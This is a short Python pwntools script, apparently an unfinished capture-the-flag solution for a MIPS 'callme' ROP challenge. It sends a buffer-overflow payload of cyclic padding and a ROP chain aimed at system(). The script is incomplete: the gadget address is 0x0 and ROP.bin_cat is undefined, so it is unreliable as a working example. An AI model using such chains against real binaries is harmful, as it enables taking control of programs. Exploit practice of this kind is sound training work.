from pwn import *

splash()
elf = context.binary = ELF("./callme_mipsel")


class ROP:
    gadget1 = 0x0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.gadget1,
        0xDEADBEEF,
        elf.plt.system,
        ROP.bin_cat
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()